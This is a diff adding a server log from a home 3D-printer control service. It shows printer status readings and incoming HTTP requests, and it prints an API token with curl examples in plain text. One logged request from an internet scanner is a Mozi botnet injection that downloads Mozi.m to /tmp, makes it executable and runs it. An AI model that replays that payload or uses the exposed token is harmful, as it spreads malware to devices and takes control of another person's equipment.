@@ -1,0 +1,444 @@
+nohup: ignoring input
+🔒 Loaded API Token from .env
+
+Use this token for API calls:
+
+curl -X POST -H "Content-Type: application/json" -H "Authorization: eb81ad2ddec4b9622a98bfb40e361b57" -d '{"file_path": "Cuboid_PLA_17m.gcode"}' http://localhost:5000/print
+curl -X POST -H "Authorization: eb81ad2ddec4b9622a98bfb40e361b57" http://localhost:5000/stop
+curl -X GET -H "Authorization: eb81ad2ddec4b9622a98bfb40e361b57" http://localhost:5000/status
+
+Scanning network 192.168.68.0/24 for 3D printers...
+
+✅ Found Printers:
+1. moonraker @ 192.168.68.55
+ * Serving Flask app 'client2'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.68.67:5000
+Press CTRL+C to quit
+89.138.252.202 - - [28/Apr/2025 22:07:12] "GET /status HTTP/1.1" 200 -
+192.168.68.67 - - [28/Apr/2025 22:07:25] "GET /api/version HTTP/1.1" 404 -
+89.138.252.202 - - [28/Apr/2025 22:07:28] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:07:51] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:07:52] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:07:54] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:08:11] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:08:22] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:08:24] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:08:50] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:08:52] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:09:00] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:12:21] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:12:23] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:12:57] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:12:58] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:18:37] "GET /status HTTP/1.1" 200 -
+122.96.48.244 - - [28/Apr/2025 22:39:08] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+122.96.48.244 - - [28/Apr/2025 22:39:08] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+89.138.252.202 - - [28/Apr/2025 22:41:13] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:41:14] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:41:17] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:47:30] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:47:34] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:47:38] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:47:45] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:48:44] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:28] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:28] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:34] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:34] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:38] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:40] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:42] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:55] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:50:57] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:52:12] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:52:19] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:52:23] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:55:28] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:55:32] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:55:35] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:55:38] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 22:55:40] "GET /status HTTP/1.1" 200 -
+192.168.68.62 - - [28/Apr/2025 22:58:49] "GET /api/version HTTP/1.1" 404 -
+192.168.68.62 - - [28/Apr/2025 23:02:00] "GET /api/version HTTP/1.1" 404 -
+192.168.68.62 - - [28/Apr/2025 23:09:05] "GET /api/version HTTP/1.1" 404 -
+192.168.68.62 - - [28/Apr/2025 23:09:43] "GET /api/version HTTP/1.1" 404 -
+192.168.68.62 - - [28/Apr/2025 23:10:18] "GET /api/version HTTP/1.1" 404 -
+192.168.68.62 - - [28/Apr/2025 23:14:16] "GET /api/version HTTP/1.1" 404 -
+89.138.252.202 - - [28/Apr/2025 23:27:44] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:28:25] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:28:29] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:28:33] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:28:36] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:28:49] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [28/Apr/2025 23:29:10] "GET /status HTTP/1.1" 200 -
+198.235.24.30 - - [29/Apr/2025 00:40:46] "GET / HTTP/1.0" 404 -
+92.255.57.58 - - [29/Apr/2025 02:17:41] "GET /jars HTTP/1.1" 404 -
+92.255.57.58 - - [29/Apr/2025 02:21:07] "GET / HTTP/1.1" 404 -
+92.255.57.58 - - [29/Apr/2025 02:22:06] "POST /service/extdirect HTTP/1.1" 404 -
+205.210.31.59 - - [29/Apr/2025 02:24:20] "GET / HTTP/1.1" 404 -
+64.62.197.71 - - [29/Apr/2025 03:07:07] "GET / HTTP/1.1" 404 -
+64.62.197.67 - - [29/Apr/2025 03:07:28] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.71 - - [29/Apr/2025 03:07:38] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.197.66 - - [29/Apr/2025 03:07:44] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+95.214.55.226 - - [29/Apr/2025 03:54:32] "GET /config HTTP/1.1" 404 -
+93.123.109.222 - - [29/Apr/2025 05:01:50] "GET / HTTP/1.1" 404 -
+45.33.14.197 - - [29/Apr/2025 06:47:29] "GET / HTTP/1.1" 404 -
+89.138.252.202 - - [29/Apr/2025 08:33:25] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:29] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:33] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:36] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:38] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:39] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:33:44] "GET /status HTTP/1.1" 200 -
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.38C
+🔥 Nozzle Temp: 27.04C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.39C
+🔥 Nozzle Temp: 27.03C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.36C
+🔥 Nozzle Temp: 27.02C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.37C
+🔥 Nozzle Temp: 27.02C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.36C
+🔥 Nozzle Temp: 27.03C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.37C
+🔥 Nozzle Temp: 27.04C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.37C
+🔥 Nozzle Temp: 27.02C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.36C
+🔥 Nozzle Temp: 27.03C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.38C
+🔥 Nozzle Temp: 27.04C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.37C
+🔥 Nozzle Temp: 27.05C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.38C
+🔥 Nozzle Temp: 27.06C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.38C
+🔥 Nozzle Temp: 27.07C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.4C
+🔥 Nozzle Temp: 27.06C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.38C
+🔥 Nozzle Temp: 27.07C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.39C
+🔥 Nozzle Temp: 27.05C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.42C
+🔥 Nozzle Temp: 27.1C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.48C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.19C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.49C
+🔥 Nozzle Temp: 27.2C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.5C
+🔥 Nozzle Temp: 27.21C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.5C
+🔥 Nozzle Temp: 27.22C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.22C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.53C
+🔥 Nozzle Temp: 27.22C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.53C
+🔥 Nozzle Temp: 27.23C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.52C
+🔥 Nozzle Temp: 27.23C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.23C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.52C
+🔥 Nozzle Temp: 27.22C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.23C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.52C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.53C
+🔥 Nozzle Temp: 27.25C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.51C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.52C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.52C
+🔥 Nozzle Temp: 27.24C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.54C
+🔥 Nozzle Temp: 27.25C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.59C
+🔥 Nozzle Temp: 27.29C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.58C
+🔥 Nozzle Temp: 27.32C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.59C
+🔥 Nozzle Temp: 27.32C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.6C
+🔥 Nozzle Temp: 27.33C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.6C
+🔥 Nozzle Temp: 27.32C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.61C
+🔥 Nozzle Temp: 27.34C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 26.58C
+🔥 Nozzle Temp: 27.31C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.36C
+🔥 Nozzle Temp: 25.44C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.36C
+🔥 Nozzle Temp: 25.43C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.36C
+🔥 Nozzle Temp: 25.43C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.36C
+🔥 Nozzle Temp: 25.45C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.37C
+🔥 Nozzle Temp: 25.45C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.37C
+🔥 Nozzle Temp: 25.45C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+🖨️ Status: standby
+📂 File: 
+🔥 Bed Temp: 25.35C
+🔥 Nozzle Temp: 25.43C
+📈 Progress: 0.0%
+🔎 Checking printer status and metrics...
+89.138.252.202 - - [29/Apr/2025 08:42:16] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:44:11] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 08:44:15] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:04:55] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:05:01] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:05:04] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:06:40] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:15:57] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:16:05] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:16:16] "GET /status HTTP/1.1" 200 -
+89.138.252.202 - - [29/Apr/2025 09:16:21] "GET /status HTTP/1.1" 200 -
+64.62.197.29 - - [29/Apr/2025 09:50:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¹NÄ"õñÅÔ®ºúcô\x08¶NZ\\z\x88(\x93\x9f\x82\x95\x8dÈ¸\x9c"uÚ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+64.62.197.29 - - [29/Apr/2025 09:50:08] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¹NÄ"õñÅÔ®ºúcô\x08¶NZ\\z\x88(\x93\x9f\x82\x95\x8dÈ¸\x9c"uÚ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+198.235.24.49 - - [29/Apr/2025 10:03:43] code 400, message Bad request version ('À\x13À')
+198.235.24.49 - - [29/Apr/2025 10:03:43] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x81\x9a\x05;\x14Æ\x8b}\x08#ÉÈC0ïo\x13_D?`\x1c\x02÷-F\x93ÇÀ¯\x96  é\x18Ôoèex\x9b\x98£åâ¹\x8b>¨¢@ñ±\x97ÂQmK\x03\x99³ôù\x12"\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+198.235.24.49 - - [29/Apr/2025 10:03:44] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.49 - - [29/Apr/2025 10:03:44] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ã\x80A!&ô¯Mëj\x88HÇÆÄ&ÝY\x9aró\x09ào\x9dR\x19ò\x99ý}C\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
